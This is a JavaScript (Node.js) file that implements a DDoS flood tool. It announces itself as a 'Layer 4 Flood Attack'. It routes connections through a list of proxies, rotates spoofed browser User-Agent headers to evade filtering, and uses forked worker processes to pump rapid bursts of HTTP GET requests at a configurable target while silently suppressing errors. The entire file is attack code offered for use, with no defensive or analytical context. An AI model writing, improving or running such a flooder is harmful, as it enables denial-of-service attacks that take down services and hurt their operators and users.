const net = require("net");
const dns = require('dns');
const fs = require("fs");
const util = require('util');
const os = require("os");
const cluster = require("cluster");
const crypto = require("crypto");
const v8 = require("v8");
const colors = require("colors");

const lookupPromise = util.promisify(dns.lookup);

// Default settings
const MAX_RAM_PERCENTAGE = 65;
const RESTART_DELAY = 1000;
const THREADS = 1;
const RATE = 100;
const TIME = 30; // in seconds

let proxies = [];
let target = "example.com";
let port = 80;

const browsers = ["chrome", "safari", "brave", "firefox", "mobile", "opera", "operagx"];
const accept_header = [
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8'
];

// Function to generate random User-Agent
const getRandomBrowser = () => {
    const randomIndex = Math.floor(Math.random() * browsers.length);
    return browsers[randomIndex];
};

const generateUserAgent = (browser) => {
    const versions = {
        chrome: { min: 115, max: 124 },
        safari: { min: 14, max: 16 },
        brave: { min: 115, max: 124 },
        firefox: { min: 99, max: 112 },
        mobile: { min: 85, max: 105 },
        opera: { min: 70, max: 90 },
        operagx: { min: 70, max: 90 }
    };

    const version = Math.floor(Math.random() * (versions[browser].max - versions[browser].min + 1)) + versions[browser].min;

    const userAgentMap = {
        chrome: `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${version}.0.0.0 Safari/537.36`,
        safari: `Mozilla/5.0 (Macintosh; Intel Mac OS X 10_${version}_0) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/${version}.0 Safari/605.1.15`,
        brave: `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${version}.0.0.0 Safari/537.36`,
        firefox: `Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:${version}.0) Gecko/20100101 Firefox/${version}.0`,
        mobile: `Mozilla/5.0 (Linux; Android 10; Mobile) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${version}.0.0.0 Mobile Safari/537.36`,
        opera: `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${version}.0.0.0 Safari/537.36`,
        operagx: `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${version}.0.0.0 Safari/537.36`
    };

    return userAgentMap[browser];
};

// Read proxies from file
function readLines(filePath) {
    return fs.readFileSync(filePath, "utf-8").toString().split(/\r?\n/);
}

// Random selection functions
function randomIntn(min, max) {
    return Math.floor(Math.random() * (max - min + 1)) + min;
}

function randomElement(elements) {
    return elements[randomIntn(0, elements.length)];
}

// TCP Socket flood function
class NetSocket {
    constructor() { }

    sendRequest(options, callback) {
        const payload = `GET / HTTP/1.1\r\nHost: ${options.address}\r\nUser-Agent: ${options.userAgent}\r\nConnection: Keep-Alive\r\n\r\n`;
        const buffer = Buffer.from(payload);

        const connection = net.connect({
            host: options.host,
            port: options.port,
            allowHalfOpen: true,
            writable: true,
            readable: true
        });

        connection.setTimeout(60000);
        connection.setKeepAlive(true);
        connection.setNoDelay(true);
        connection.on("connect", () => {
            connection.write(buffer);
        });

        connection.on("data", chunk => {
            const response = chunk.toString("utf-8");
            if (!response.includes("HTTP/1.1 200")) {
                connection.destroy();
                return callback(undefined, "error: invalid response");
            }
            return callback(connection, undefined);
        });

        connection.on("timeout", () => {
            connection.destroy();
            return callback(undefined, "error: timeout exceeded");
        });
    }
}

const Socker = new NetSocket();

function runFlooder() {
    const proxyAddr = randomElement(proxies);
    const parsedProxy = proxyAddr.split(":");
    const targetHost = target;
    const targetPort = port;

    const userAgent = generateUserAgent(getRandomBrowser());
    const headers = {
        'User-Agent': userAgent,
        'Accept': randomElement(accept_header),
        'Connection': 'keep-alive',
        'Accept-Encoding': 'gzip, deflate, br',
        'Accept-Language': 'en-US,en;q=0.9',
    };

    const proxyOptions = {
        host: parsedProxy[0],
        port: ~~parsedProxy[1],
        address: targetHost,
        userAgent: userAgent,
        timeout: 10
    };

    Socker.sendRequest(proxyOptions, (connection, error) => {
        if (error) return;

        connection.setKeepAlive(true);
        connection.setNoDelay(true);

        const attackInterval = setInterval(() => {
            for (let i = 0; i < RATE; i++) {
                const request = connection.write(`GET / HTTP/1.1\r\nHost: ${targetHost}\r\nUser-Agent: ${userAgent}\r\nConnection: keep-alive\r\n\r\n`);
                if (!request) clearInterval(attackInterval);
            }
        }, 500); // adjust for attack rate
    });
}

if (cluster.isMaster) {
    console.clear();
    console.log(`[!] Starting Layer 4 Flood Attack`.red);
    console.log(`--------------------------------------------`.gray);
    console.log("[>] Target: ".yellow + target.cyan);
    console.log('[>] Time: '.magenta + TIME);
    console.log('[>] Rate: '.blue + RATE);
    console.log('[>] Thread(s): '.red + THREADS);
    console.log("[>] ProxyFile: ".cyan + 'proxies.txt');
    console.log(`--------------------------------------------`.gray);

    proxies = readLines('proxies.txt');

    for (let counter = 1; counter <= THREADS; counter++) {
        cluster.fork();
    }

    const handleRAMUsage = () => {
        const totalRAM = os.totalmem();
        const usedRAM = totalRAM - os.freemem();
        const ramPercentage = (usedRAM / totalRAM) * 100;

        if (ramPercentage >= MAX_RAM_PERCENTAGE) {
            console.log('[!] Maximum RAM usage:', ramPercentage.toFixed(2), '%');
            process.exit();
        }
    };

    setInterval(handleRAMUsage, 5000);

} else {
    setInterval(runFlooder, 1);  // Adjust the attack interval
}

// Stop the script after a specified time
setTimeout(() => {
    process.exit();
}, TIME * 1000);

process.on('uncaughtException', error => { });
process.on('unhandledRejection', error => { });
